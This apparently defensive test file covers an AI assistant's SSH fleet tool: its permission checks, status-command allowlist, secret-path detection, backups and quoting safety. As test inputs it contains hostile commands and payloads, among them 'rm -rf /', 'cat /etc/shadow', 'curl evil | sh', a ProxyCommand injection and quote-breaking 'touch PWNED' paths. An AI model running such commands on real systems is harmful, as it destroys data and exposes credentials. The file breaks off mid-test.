import { execFile, spawn, type ChildProcess } from "node:child_process";
import { existsSync } from "node:fs";
import {
  chmod,
  lstat,
  mkdir,
  mkdtemp,
  readdir,
  readFile,
  rename,
  rm,
  stat,
  symlink,
  writeFile,
} from "node:fs/promises";
import { createServer } from "node:net";
import { tmpdir, userInfo } from "node:os";
import { join } from "node:path";
import { promisify } from "node:util";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import type { ToolHost } from "../src/core/agentTools.ts";
import {
  BACKUP_ID,
  checkMachine,
  connectionProblem,
  explain,
  Fleet,
  REMOTE_SCRIPTS,
  type Machine,
} from "../src/core/fleet.ts";
import {
  backupFor,
  FILE_TOO_LONG,
  isRemoteSecret,
  isStatusCommand,
  remoteChangesSomething,
} from "../src/core/fleetRules.ts";
import { createFleetTools } from "../src/core/fleetTools.ts";
import {
  changesSomething,
  TOOLS,
  toolVerdict,
  type PolicyContext,
  type RequestSummary,
  type Verdict,
} from "../src/core/permissions.ts";
import { describeRequest } from "../src/core/requestWords.ts";

const proxmox: Machine = {
  id: "aaaaaaaaaaaaaaaa",
  name: "proxmox",
  host: "192.168.1.10",
  port: 22,
  user: "root",
  lookWithoutAsking: false,
};
const nas: Machine = {
  id: "bbbbbbbbbbbbbbbb",
  name: "NAS",
  host: "nas.local",
  port: 2222,
  user: "admin",
  lookWithoutAsking: true,
};

function fleetOf(machines: Machine[], dir = "/nonexistent/fleet"): Fleet {
  return new Fleet({ dir, machines: () => machines });
}

function context(machines: Machine[], over: Partial<PolicyContext> = {}): PolicyContext {
  const fleet = fleetOf(machines);
  return {
    workspace: "/tmp/ws",
    home: "/home/captain",
    findMachine: (name) => fleet.find(name),
    ...over,
  };
}

function asked(verdict: Verdict): Extract<Verdict, { decision: "ask" }> {
  if (verdict.decision !== "ask") throw new Error("expected a question");
  return verdict;
}

describe("what the user types for a machine", () => {
  it("is tidied and accepted when it is sensible", () => {
    expect(
      checkMachine({ name: "  my   NAS ", host: " nas.local ", port: 22, user: " admin " }),
    ).toEqual({ name: "my NAS", host: "nas.local", port: 22, user: "admin" });
  });

  it.each([
    [{ name: "", host: "a.b", port: 22, user: "root" }, "short name"],
    [{ name: "x", host: "-oProxyCommand=evil", port: 22, user: "root" }, "address"],
    [{ name: "x", host: "host name", port: 22, user: "root" }, "address"],
    [{ name: "x", host: "a.b", port: 22, user: "-l root" }, "user name"],
    [{ name: "x", host: "a.b", port: 22, user: "ro;ot" }, "user name"],
    [{ name: "x", host: "a.b", port: 0, user: "root" }, "port"],
    [{ name: "x", host: "a.b", port: 70000, user: "root" }, "port"],
    [{ name: "x", host: "a.b", port: 22.5, user: "root" }, "port"],
  ])("refuses %o", (input, word) => {
    expect(() => checkMachine(input)).toThrow(word);
  });

  it("keeps its fixed scripts free of anything shells read differently", () => {
    for (const script of Object.values(REMOTE_SCRIPTS)) {
      expect(script).not.toMatch(/['\\!\n]/);
    }
  });

  it("puts SSH's complaints into words that can be acted on", () => {
    expect(explain("@@@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @@@")).toContain(
      "not the one whose fingerprint was confirmed",
    );
    expect(explain("root@10.0.0.2: Permission denied (publickey).")).toContain(
      "did not accept her key",
    );
    // A file she may not read there is not a key problem.
    expect(explain("head: cannot open '/root/x' for reading: Permission denied")).not.toContain(
      "her key",
    );
    expect(explain("ssh: connect to host 10.0.0.2 port 22: Connection refused")).toContain(
      "did not answer",
    );
  });

  it("tells a connection that failed from a command that ran and failed", () => {
    // What SSH really printed for the runner VM with another identity on file (2026-11-22).
    const alarm =
      "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!";
    expect(connectionProblem({ code: 255, output: alarm, timedOut: false })).toContain(
      "not the one whose fingerprint was confirmed",
    );
    expect(
      connectionProblem({
        code: 255,
        output: "claude@192.168.50.218: Permission denied (publickey).",
        timedOut: false,
      }),
    ).toContain("did not accept her key");
    expect(
      connectionProblem({
        code: 255,
        output: "ssh: connect to host 192.168.50.219 port 22: No route to host",
        timedOut: false,
      }),
    ).toContain("did not answer");
    // It ran there, and what it printed is its own affair, whatever the words.
    for (const ran of [
      {
        code: 1,
        output: "ssh: connect to host backup port 22: Connection refused",
        timedOut: false,
      },
      { code: 255, output: "rsync finished\nConnection refused by the mirror", timedOut: false },
      { code: 0, output: "active", timedOut: false },
    ]) {
      expect(connectionProblem(ran), ran.output).toBeNull();
    }
  });
});

describe("finding a machine by the name she was given", () => {
  const fleet = fleetOf([proxmox, nas, { ...nas, id: "cccccccccccccccc", name: "nas-backup" }]);

  it("takes the exact name, whatever the capitals", () => {
    expect(fleet.find("PROXMOX").id).toBe(proxmox.id);
    expect(fleet.find("nas").id).toBe(nas.id); // exact beats "nas-backup"
  });

  it("takes the only one that starts that way", () => {
    expect(fleet.find("prox").id).toBe(proxmox.id);
  });

  it("says which there are when the name fits none or several", () => {
    expect(() => fleet.find("router")).toThrow("Known machines: proxmox, NAS, nas-backup");
    expect(() => fleet.find("na")).toThrow("could be several");
    expect(() => fleet.find("")).toThrow("No machine is called");
  });

  it("says where machines are added when there are none", () => {
    expect(() => fleetOf([]).find("proxmox")).toThrow("Your other machines");
  });
});

describe("the plain status commands", () => {
  it.each([
    "uptime",
    "df -h",
    "df -hT",
    "free -h",
    "uname -a",
    "qm list",
    "pct list",
    "qm status 101",
    "pveversion -v",
    "pvesm status",
    "zpool status",
    "zpool status -x tank",
    "zfs list",
    "systemctl is-active nginx.service",
    "docker ps",
    "cat /proc/loadavg",
    "  uptime  ",
    "pvesh get /cluster/resources",
    "df -h /",
    "df -hT /mnt/tank/media",
    "df /",
    // A few of them in one line, which is how she asks how a machine is doing.
    "uptime && free -m && df -h /",
    "uptime; free -h; df -h /",
    "smartctl -H /dev/sda; id",
    "systemctl is-active sshd && systemctl is-failed nginx",
  ])("counts %s as only looking", (command) => {
    expect(isStatusCommand(command)).toBe(true);
  });

  it.each([
    "uptime; rm -rf /",
    "uptime && reboot",
    "df -h | sh",
    "qm stop 101",
    "qm list > /etc/passwd",
    "cat /etc/shadow",
    "cat /proc/loadavg /etc/shadow",
    "systemctl restart nginx",
    "systemctl is-active $(reboot)",
    "docker ps -q | xargs docker rm",
    "docker exec web sh",
    "zpool destroy tank",
    "zpool status 1",
    "zpool list 5",
    "zfs list\nreboot",
    "pvesh get /access/users",
    "pvesh create /nodes/pve/qemu",
    "uptime `id`",
    "ls /root",
    "",
    "smartctl -H /dev/sda; ls /root",
    "uptime && free -m && reboot",
    "uptime &&& id",
    "uptime;;id",
    "uptime &&",
    "uptime & id",
    "uptime || id",
    "uptime && free -m && df -h / && id && date && whoami",
    "uptime &&\nreboot",
    "df -h / /root",
    "df -h --output=source /",
    "df -h $(reboot)",
    "df -h /mnt/my disk",
    "df -h relative/path",
  ])("does not count %j as only looking", (command) => {
    expect(isStatusCommand(command)).toBe(false);
  });

  it.each([
    "/etc/shadow",
    "/root/.ssh/id_ed25519",
    "/etc/pve/priv/authkey.key",
    "/srv/app/.env",
    "/home/u/secrets.yaml",
    "/etc/ssl/private/server.key",
  ])("knows %s for a place where secrets are kept", (path) => {
    expect(isRemoteSecret(path)).toBe(true);
  });

  it.each([
    "/etc/hostname",
    "/var/log/syslog",
    "/etc/pve/qemu-server/101.conf",
    "/srv/media/film.mkv",
  ])("does not take %s for a secret", (path) => {
    expect(isRemoteSecret(path)).toBe(false);
  });
});

describe("what she may do on another machine without asking", () => {
  it("lists the machines freely", async () => {
    expect(await toolVerdict(TOOLS.remote, { action: "list" }, context([proxmox]))).toEqual({
      decision: "allow",
    });
  });

  it("asks before any command on a machine where she may not look unasked, status commands included", async () => {
    const verdict = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "run", machine: "proxmox", command: "uptime" },
        context([proxmox]),
      ),
    );
    expect(verdict.summary).toMatchObject({
      title: "Run this on proxmox?",
      detail: "On proxmox (root@192.168.1.10):\nuptime",
    });
    expect(verdict.reason).toContain("administrator");
    expect(verdict.rememberable).toBe(true);
  });

  it("lets a status command through where the user has said she may look", async () => {
    expect(
      await toolVerdict(
        TOOLS.remote,
        { action: "run", machine: "nas", command: "df -h" },
        context([nas]),
      ),
    ).toEqual({ decision: "allow" });
  });

  it("shows what a write would change, by looking at the file first", async () => {
    const seen: string[] = [];
    const look = {
      text: (_machine: Machine, path: string) => {
        seen.push(path);
        return Promise.resolve(path === "/etc/app.conf" ? "port 8080\nworkers 2\nlog on\n" : null);
      },
      backups: () => Promise.resolve([]),
      backupText: () => Promise.resolve(null),
    };
    const change = asked(
      await toolVerdict(
        TOOLS.remote,
        {
          action: "write_file",
          machine: "nas",
          path: "/etc/app.conf",
          content: "port 8080\nworkers 8\nlog on\n",
        },
        context([nas], { remoteLook: look }),
      ),
    );
    expect(seen).toEqual(["/etc/app.conf"]);
    expect(change.summary?.detail).toContain("1 lines out, 1 in");
    expect(change.summary?.detail).toContain("-workers 2\n+workers 8");
    expect(change.summary?.detail).toContain("kept as a copy first");
    // The whole of what would be written is still shown.
    expect(change.summary?.detail).toMatch(/All \d+ characters of it:/);

    const fresh = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "write_file", machine: "nas", path: "/etc/new.conf", content: "a\n" },
        context([nas], { remoteLook: look }),
      ),
    );
    expect(fresh.summary?.detail).toContain("all of this is new");

    const same = asked(
      await toolVerdict(
        TOOLS.remote,
        {
          action: "write_file",
          machine: "nas",
          path: "/etc/app.conf",
          content: "port 8080\nworkers 2\nlog on\n",
        },
        context([nas], { remoteLook: look }),
      ),
    );
    expect(same.summary?.detail).toContain("nothing would change");

    // One enormous line does not push the rest of the question out of sight, and a file
    // too long to have been read whole is said to be so, not compared as if it were whole.
    const longLine = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "write_file", machine: "nas", path: "/etc/one-line.json", content: "{}\n" },
        context([nas], {
          remoteLook: { ...look, text: () => Promise.resolve(`${"x".repeat(50_000)}\n`) },
        }),
      ),
    );
    expect(longLine.summary?.detail.length).toBeLessThan(2000);
    expect(longLine.summary?.detail).toContain("more)");
    const tooLong = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "write_file", machine: "nas", path: "/var/log/huge.log", content: "x\n" },
        context([nas], { remoteLook: { ...look, text: () => Promise.resolve(FILE_TOO_LONG) } }),
      ),
    );
    expect(tooLong.summary?.detail).toContain("too long to compare");

    // With no way to look (her test suite, say), the question is put as before.
    const blind = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "write_file", machine: "nas", path: "/etc/app.conf", content: "x\n" },
        context([nas]),
      ),
    );
    expect(blind.summary?.detail).not.toContain("What changes");
  });

  it("asks before putting a copy back, naming the file and the copy, and settles on that copy", async () => {
    const copies = [
      {
        id: "20261122T020000Z-aaaaaa",
        path: "/etc/app.conf",
        at: new Date("2026-11-22T02:00:00Z"),
        bytes: 28,
      },
      {
        id: "20261122T010000Z-bbbbbb",
        path: "/etc/other.conf",
        at: new Date("2026-11-22T01:00:00Z"),
        bytes: 5,
      },
      {
        id: "20261121T230000Z-cccccc",
        path: "/etc/app.conf",
        at: new Date("2026-11-21T23:00:00Z"),
        bytes: 27,
      },
    ];
    const look = {
      text: () => Promise.resolve("port 8080\nworkers 8\n"),
      backups: () => Promise.resolve(copies),
      backupText: (_machine: Machine, id: string) =>
        Promise.resolve(id === "20261122T020000Z-aaaaaa" ? "port 8080\nworkers 2\n" : "old\n"),
    };
    const at = context([nas], { remoteLook: look });
    // No copy named: the newest one of that file.
    const input = { action: "restore", machine: "nas", path: "/etc/app.conf" };
    const verdict = asked(await toolVerdict(TOOLS.remote, input, at));
    expect(verdict.summary?.title).toBe("Let her put this file back on NAS?");
    expect(verdict.summary?.detail).toContain("/etc/app.conf");
    expect(verdict.summary?.detail).toContain("2026-11-22 02:00 UTC (20261122T020000Z-aaaaaa");
    expect(verdict.summary?.detail).toContain("-workers 8\n+workers 2");
    expect(backupFor(input)?.id).toBe("20261122T020000Z-aaaaaa");
    // Named outright.
    const named = { action: "restore", machine: "nas", backup: "20261121T230000Z-cccccc" };
    await toolVerdict(TOOLS.remote, named, at);
    expect(backupFor(named)?.id).toBe("20261121T230000Z-cccccc");
    // A copy of another file than the one named, a made-up name, a path that is not one.
    await expect(
      toolVerdict(
        TOOLS.remote,
        {
          action: "restore",
          machine: "nas",
          path: "/etc/app.conf",
          backup: "20261122T010000Z-bbbbbb",
        },
        at,
      ),
    ).rejects.toThrow(/is of \/etc\/other.conf, not of \/etc\/app.conf/);
    await expect(
      toolVerdict(TOOLS.remote, { action: "restore", machine: "nas", backup: "$(reboot)" }, at),
    ).rejects.toThrow(/not the name of a kept copy/);
    await expect(
      toolVerdict(TOOLS.remote, { action: "restore", machine: "nas", path: "/etc/none.conf" }, at),
    ).rejects.toThrow(/No such copy is kept/);
    // Putting back changes the machine: "hands off" stops it; listing the copies does not.
    expect(remoteChangesSomething({ action: "restore", machine: "nas" })).toBe(true);
    expect(remoteChangesSomething({ action: "backups", machine: "nas" })).toBe(false);
    expect(await toolVerdict(TOOLS.remote, { action: "backups", machine: "nas" }, at)).toEqual({
      decision: "allow",
    });
  });

  it("asks for everything else even there, and shows the machine and the exact command", async () => {
    const verdict = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "run", machine: "nas", command: "docker restart plex", why: "Restart Plex" },
        context([nas]),
      ),
    );
    expect(verdict.summary).toMatchObject({
      title: "Run this on NAS?",
      detail: "On NAS (admin@nas.local):\ndocker restart plex",
      note: "Restart Plex",
    });
    expect(verdict.reason).not.toContain("administrator");
  });

  it('does not offer "for this chat" for a command with anything left to the far shell, or once she has read outside text', async () => {
    const loose = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "run", machine: "nas", command: "rm -rf $TARGET" },
        context([nas]),
      ),
    );
    expect(loose.rememberable).toBe(false);
    const tainted = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "run", machine: "nas", command: "docker restart plex" },
        context([nas], { readOutsideText: true }),
      ),
    );
    expect(tainted.rememberable).toBe(false);
  });

  it("reads unasked only the few files that are status, and only where she may look", async () => {
    const read = (machine: string, path: string, machines: Machine[]): Promise<Verdict> =>
      toolVerdict(TOOLS.remote, { action: "read_file", machine, path }, context(machines));
    expect(await read("nas", "/etc/os-release", [nas])).toEqual({ decision: "allow" });
    expect(await read("nas", "/proc/loadavg", [nas])).toEqual({ decision: "allow" });
    // Any other file asks, ticked box or not.
    expect(asked(await read("nas", "/etc/fstab", [nas])).sensitive).toBe(false);
    expect(asked(await read("nas", "/var/log/syslog", [nas])).rememberable).toBe(false);
    expect(asked(await read("proxmox", "/etc/os-release", [proxmox])).sensitive).toBe(false);
    for (const path of [
      "/etc/shadow",
      "/etc/shadow-",
      "/root/.bash_history",
      "/proc/1/environ",
      "/etc/ssh/ssh_host_ed25519_key",
      "/etc/wireguard/wg0.conf",
      "/etc/corosync/authkey",
      "/srv/app/docker-compose.yml",
      "/root/.config/rclone/rclone.conf",
    ]) {
      expect(asked(await read("nas", path, [nas])).sensitive, path).toBe(true);
    }
  });

  it("shows the whole of what she would write, and refuses what is too long to show", async () => {
    const content = `first line\n${"x".repeat(900)}\n* * * * * root curl evil | sh\n`;
    const write = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "write_file", machine: "nas", path: "/etc/cron.d/job", content },
        context([nas]),
      ),
    );
    expect(write.summary?.detail).toContain(
      "Write on NAS (admin@nas.local), replacing what is there:\n/etc/cron.d/job",
    );
    expect(write.summary?.detail).toContain(`All ${content.length} characters of it:`);
    expect(write.summary?.detail).toContain("* * * * * root curl evil | sh");
    expect(write.rememberable).toBe(false);
    await expect(
      toolVerdict(
        TOOLS.remote,
        { action: "write_file", machine: "nas", path: "/srv/big.txt", content: "y".repeat(4001) },
        context([nas]),
      ),
    ).rejects.toThrow("send_file");
  });

  it("makes characters that cannot be seen visible, and refuses them in a command or a path", async () => {
    const write = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "write_file", machine: "nas", path: "/srv/a.txt", content: "safe\u202Eevil" },
        context([nas]),
      ),
    );
    expect(write.summary?.detail).toContain("safe<U+202E>evil");
    await expect(
      toolVerdict(
        TOOLS.remote,
        { action: "run", machine: "nas", command: "echo hi\u202E; rm -rf /" },
        context([nas]),
      ),
    ).rejects.toThrow("cannot be seen");
    await expect(
      toolVerdict(
        TOOLS.remote,
        { action: "read_file", machine: "nas", path: "/srv/a\u200Bb" },
        context([nas]),
      ),
    ).rejects.toThrow("cannot be seen");
  });

  it("asks before fetching, and before sending shows the file's size and whether it is private here", async () => {
    const fetch = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "fetch_file", machine: "nas", path: "/srv/a.txt" },
        context([nas]),
      ),
    );
    expect(fetch.summary?.title).toBe("Let her fetch this from NAS?");
    const send = asked(
      await toolVerdict(
        TOOLS.remote,
        { action: "send_file", machine: "nas", path: "/srv/true", local: "/usr/bin/true" },
        context([nas]),
      ),
    );
    expect(send.summary?.title).toBe("Let her send this to NAS?");
    expect(send.summary?.detail).toMatch(/\/usr\/bin\/true \(\d+ bytes\)\n→ \/srv\/true/);
    expect(send.sensitive).toBe(false);
    await expect(
      toolVerdict(
        TOOLS.remote,
        { action: "send_file", machine: "nas", path: "/srv/b", local: "/definitely/not/here" },
        context([nas]),
      ),
    ).rejects.toThrow("There is no file here");
  });

  it("refuses, before any question, a machine it does not know or a path that is not full", async () => {
    await expect(
      toolVerdict(
        TOOLS.remote,
        { action: "run", machine: "router", command: "uptime" },
        context([nas]),
      ),
    ).rejects.toThrow("No machine is called");
    await expect(
      toolVerdict(
        TOOLS.remote,
        { action: "read_file", machine: "nas", path: "notes.txt" },
        context([nas]),
      ),
    ).rejects.toThrow("full path");
    await expect(
      toolVerdict(TOOLS.remote, { action: "run", machine: "nas", command: "  " }, context([nas])),
    ).rejects.toThrow("no command");
    await expect(toolVerdict(TOOLS.remote, { action: "dance" }, context([nas]))).rejects.toThrow(
      "needs an action",
    );
  });

  it("counts as a change everything but looking, for the hands-off switch", () => {
    expect(changesSomething(TOOLS.remote, { action: "list" })).toBe(false);
    expect(
      changesSomething(TOOLS.remote, { action: "read_file", machine: "nas", path: "/x" }),
    ).toBe(false);
    expect(
      changesSomething(TOOLS.remote, { action: "run", machine: "nas", command: "uptime" }),
    ).toBe(false);
    expect(
      changesSomething(TOOLS.remote, { action: "run", machine: "nas", command: "reboot" }),
    ).toBe(true);
    expect(
      changesSomething(TOOLS.remote, { action: "write_file", machine: "nas", path: "/x" }),
    ).toBe(true);
    expect(
      changesSomething(TOOLS.remote, { action: "fetch_file", machine: "nas", path: "/x" }),
    ).toBe(true);
    expect(remoteChangesSomething({ action: "nonsense" })).toBe(true);
  });

  it("names the machine in the record by what it really is, once that is settled", async () => {
    const input = { action: "run", machine: "prox", command: "qm stop 101", why: "Stop it" };
    expect(describeRequest(TOOLS.remote, input).detail).toBe("On prox:\nqm stop 101");
    await toolVerdict(TOOLS.remote, input, context([proxmox]));
    expect(describeRequest(TOOLS.remote, input)).toEqual({
      title: "Let her do this on another machine?",
      detail: "On proxmox (root@192.168.1.10):\nqm stop 101",
      note: "Stop it",
    });
  });

  it("does not act on a machine that changed or went while the question was open", () => {
    let machines = [proxmox];
    const fleet = new Fleet({ dir: "/nonexistent", machines: () => machines });
    expect(fleet.same(proxmox).id).toBe(proxmox.id);
    machines = [{ ...proxmox, host: "10.9.9.9" }];
    expect(() => fleet.same(proxmox)).toThrow("changed or removed");
    machines = [];
    expect(() => fleet.same(proxmox)).toThrow("changed or removed");
  });
});

describe("letting her key in and taking it out again, as the far side runs it", () => {
  const key =
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHerKeyHerKeyHerKeyHerKeyHerKeyHerKeyHerKeyX ai-chan@pc";
  const word = Buffer.from(key).toString("base64");
  const blob = Buffer.from(key.split(" ")[1] ?? "").toString("base64");

  async function runScript(script: string, arg: string, home: string): Promise<void> {
    await promisify(execFile)("sh", ["-c", script, "sh", arg], {
      env: { ...process.env, HOME: home },
    });
  }

  it("adds her key on its own line, once, even when the file did not end in a line end", async () => {
    const home = await mkdtemp(join(tmpdir(), "aichan-letin-"));
    try {
      await mkdir(join(home, ".ssh"));
      const file = join(home, ".ssh", "authorized_keys");
      await writeFile(file, "ssh-ed25519 AAAAusersownkey user@laptop"); // no line end
      await runScript(REMOTE_SCRIPTS.letIn, word, home);
      await runScript(REMOTE_SCRIPTS.letIn, word, home);
      expect(await readFile(file, "utf8")).toBe(
        `ssh-ed25519 AAAAusersownkey user@laptop\n${key}\n`,
      );
      await runScript(REMOTE_SCRIPTS.forget, blob, home);
      expect(await readFile(file, "utf8")).toBe("ssh-ed25519 AAAAusersownkey user@laptop\n");
    } finally {
      await rm(home, { recursive: true, force: true });
    }
  });

  it("makes the folder and the file when there were none", async () => {
    const home = await mkdtemp(join(tmpdir(), "aichan-letin-"));
    try {
      await runScript(REMOTE_SCRIPTS.letIn, word, home);
      expect(await readFile(join(home, ".ssh", "authorized_keys"), "utf8")).toBe(`${key}\n`);
      await runScript(REMOTE_SCRIPTS.forget, blob, home);
      expect(await readFile(join(home, ".ssh", "authorized_keys"), "utf8")).toBe("");
    } finally {
      await rm(home, { recursive: true, force: true });
    }
  });
});

// ---------------------------------------------------------------- against a real SSH server

const SSHD = "/usr/bin/sshd";
const haveSshd = existsSync(SSHD) && existsSync("/usr/bin/ssh-keygen");

function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const probe = createServer();
    probe.on("error", reject);
    probe.listen(0, "127.0.0.1", () => {
      const address = probe.address();
      const port = typeof address === "object" && address !== null ? address.port : 0;
      probe.close(() => resolve(port));
    });
  });
}

describe.skipIf(!haveSshd)("reaching a real machine over SSH", () => {
  let base = "";
  let server: ChildProcess | null = null;
  let machine: Machine;
  let fleet: Fleet;
  let keysFile = "";

  beforeAll(async () => {
    base = await mkdtemp(join(tmpdir(), "aichan-fleet-"));
    const home = join(base, "home");
    await mkdir(join(home, ".ssh"), { recursive: true, mode: 0o700 });
    await mkdir(join(base, "files"));
    keysFile = join(home, ".ssh", "authorized_keys");
    await promisify(execFile)("ssh-keygen", [
      "-q",
      "-t",
      "ed25519",
      "-N",
      "",
      "-f",
      join(base, "hostkey"),
    ]);
    const port = await freePort();
    // A server of this user's own, on this computer only, whose "home" is the test folder.
    await writeFile(
      join(base, "sshd_config"),
      [
        `Port ${port}`,
        "ListenAddress 127.0.0.1",
        `HostKey ${join(base, "hostkey")}`,
        `PidFile ${join(base, "pid")}`,
        `AuthorizedKeysFile ${keysFile}`,
        "PasswordAuthentication no",
        "KbdInteractiveAuthentication no",
        "UsePAM no",
        "StrictModes no",
        `SetEnv HOME=${home}`,
        "LogLevel ERROR",
        "",
      ].join("\n"),
    );
    server = spawn(SSHD, ["-D", "-e", "-f", join(base, "sshd_config")], { stdio: "ignore" });
    machine = {
      id: Fleet.newId(),
      name: "testbox",
      host: "127.0.0.1",
      port,
      user: userInfo().username,
      lookWithoutAsking: true,
    };
    fleet = new Fleet({ dir: join(base, "fleet"), machines: () => [machine] });
    // Wait for it to answer.
    for (let attempt = 0; attempt < 40; attempt++) {
      const up = await fleet.hostKeys(machine).then(
        () => true,
        () => false,
      );
      if (up) break;
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
  }, 30_000);

  afterAll(async () => {
    server?.kill();
    await rm(base, { recursive: true, force: true });
  });

  it("signs in only once its fingerprint is confirmed and her key has been let in", async () => {
    const key = await fleet.publicKey(machine.id);
    expect(key).toMatch(/^ssh-ed25519 \S+ ai-chan@/);
    expect((await fleet.canSignIn(machine)).why).toContain("fingerprint has not been confirmed");
    const keys = await fleet.hostKeys(machine);
    expect(keys.fingerprints[0]).toMatch(/^ED25519 SHA256:/);
    await fleet.trust(machine.id, keys);
    expect((await fleet.canSignIn(machine)).why).toContain("did not accept her key");
    await writeFile(keysFile, `ssh-ed25519 AAAAsomeoneelse other@key\n${key}\n`, { mode: 0o600 });
    expect(await fleet.canSignIn(machine)).toEqual({ ok: true, why: "" });
    // Her private key is for the user's eyes only.
    const mode = (await import("node:fs/promises")).stat;
    expect(((await mode(join(base, "fleet", machine.id, "key"))).mode & 0o777).toString(8)).toBe(
      "600",
    );
  });

  it("runs a command and reports what it printed and how it ended", async () => {
    expect(await fleet.run(machine, "echo hello; echo oops >&2")).toMatchObject({
      code: 0,
      timedOut: false,
    });
    expect((await fleet.run(machine, "echo hello")).output).toBe("hello");
    expect((await fleet.run(machine, "exit 3")).code).toBe(3);
    const slow = await fleet.run(machine, "sleep 5", { timeoutMs: 800 });
    expect(slow.timedOut).toBe(true);
  });

  it("reads and writes files whose names would trip a shell", async () => {
    // If the name were handed to the far shell unquoted, it would make a file called PWNED
    // in the home folder there.
    const odd = join(base, "files", `it's a "test" $(touch PWNED) \`touch PWNED\` file.txt`);
    await fleet.writeFile(machine, odd, "line one\nline two — ünïcode\n");
    expect(await readFile(odd, "utf8")).toBe("line one\nline two — ünïcode\n");
    expect(await fleet.readFile(machine, odd)).toBe("line one\nline two — ünïcode\n");
    expect(existsSync(join(base, "home", "PWNED"))).toBe(false);
    expect(existsSync(join(base, "files", "PWNED"))).toBe(false);
    await expect(fleet.readFile(machine, "/nope/nothing")).rejects.toThrow();
    // Paths written to break out of quotes in one shell or another. None may run anything.
    for (const path of [
      "/x\\' ; touch PWNED ; echo \\'",
      "/x' ; touch PWNED ; echo '",
      '/x" ; touch PWNED ; echo "',
      "/x\ntouch PWNED",
      "/x; touch PWNED",
      "/x | touch PWNED",
    ]) {
      await expect(fleet.readFile(machine, path)).rejects.toThrow();
    }
    expect(existsSync(join(base, "home", "PWNED"))).toBe(false);
    await expect(fleet.readFile(machine, "/usr/bin/true")).rejects.toThrow("not text");
  });

  it("leaves the old file whole when a send cannot be read here after all", async () => {
    const there = join(base, "files", "precious");
    await fleet.writeFile(machine, there, "do not lose me\n");
    const unreadable = join(base, "files", "locked");
    await writeFile(unreadable, "secret");
    await chmod(unreadable, 0o000);
    await expect(fleet.send(machine, unreadable, there)).rejects.toThrow();
    expect(await readFile(there, "utf8")).toBe("do not lose me\n");
    await chmod(unreadable, 0o600);
  });

  it("copies a file there and back unchanged", async () => {
    const there = join(base, "files", "sent");
    const back = join(base, "files", "fetched");
    const sent = await fleet.send(machine, "/usr/bin/true", there);
    // Nothing was there before, so there was nothing to keep a copy of.
    expect(sent.backup).toBeNull();
    expect(await fleet.fetch(machine, there, back)).toBe(sent.bytes);
    expect((await readFile(back)).equals(await readFile("/usr/bin/true"))).toBe(true);
    await chmod(back, 0o600);
  });

  it("keeps what was there before a write, lists it, and puts it back", async () => {
    const file = join(base, "files", "app.conf");
    await writeFile(file, "workers 2\n", { mode: 0o640 });
    await chmod(file, 0o640);
    const kept = await fleet.writeFile(machine, file, "workers 8\n");
    expect(kept).toMatch(BACKUP_ID);
    expect(await readFile(file, "utf8")).toBe("workers 8\n");
    // The new file has the old one's permissions, not whatever the account's default is.
    expect((await stat(file)).mode & 0o777).toBe(0o640);
    const copies = await fleet.backups(machine);
    expect(copies.find((copy) => copy.id === kept)).toMatchObject({ path: file, bytes: 10 });
    expect(await fleet.backupText(machine, kept ?? "")).toBe("workers 2\n");
    // The copies are for her account alone.
    expect((await stat(join(base, "home", ".ai-chan-backups", kept ?? ""))).mode & 0o077).toBe(0);

    const undo = await fleet.restore(machine, kept ?? "");
    expect(await readFile(file, "utf8")).toBe("workers 2\n");
    // Putting back keeps what it replaced, so it can be undone too.
    expect(undo).toMatch(BACKUP_ID);
    await fleet.restore(machine, undo ?? "");
    expect(await readFile(file, "utf8")).toBe("workers 8\n");
  });

  it("writes through a link to the file it points at, and refuses a folder or a special file", async () => {
    const real = join(base, "files", "real.conf");
    const link = join(base, "files", "link.conf");
    await writeFile(real, "as it was\n");
    await symlink(real, link);
    const kept = await fleet.writeFile(machine, link, "changed\n");
    // The link is still a link, the file behind it is what changed, and the copy is of that file.
    expect((await lstat(link)).isSymbolicLink()).toBe(true);
    expect(await readFile(real, "utf8")).toBe("changed\n");
    expect((await fleet.backups(machine)).find((copy) => copy.id === kept)?.path).toBe(real);
    await fleet.restore(machine, kept ?? "");
    expect(await readFile(real, "utf8")).toBe("as it was\n");
    expect((await lstat(link)).isSymbolicLink()).toBe(true);

    const folder = join(base, "files", "a-folder");
    await mkdir(folder);
    await expect(fleet.writeFile(machine, folder, "x\n")).rejects.toThrow(
      /folder or a special file/,
    );
    expect(await readdir(folder)).toEqual([]);
    const pipe = join(base, "files", "a-pipe");
    await promisify(execFile)("mkfifo", [pipe]);
    await expect(fleet.writeFile(machine, pipe, "x\n")).rejects.toThrow(/folder or a special file/);
    expect((await lstat(pipe)).isFIFO()).toBe(true);
  });

  it("does not replace a file too large to keep a copy of", async () => {
    const big = join(base, "files", "big.img");
    // 101 MB that takes no room: a file with a hole in it.
    await promisify(execFile)("truncate", ["-s", "101M", big]);
    await expect(fleet.writeFile(machine, big, "small now\n")).rejects.toThrow(/over 100 MB/);
    expect((await stat(big)).size).toBe(101 * 1024 * 1024);
    await rm(big);
  });

  it("keeps no copy of a file that was not there, and takes no name that is not a copy's", async () => {
    const file = join(base, "files", "brand-new.txt");
    expect(await fleet.writeFile(machine, file, "hello\n")).toBeNull();
    expect(await readFile(file, "utf8")).toBe("hello\n");
    for (const name of ["../../etc", "20261122T010000Z-zzzzzz", "", "$(id)"]) {
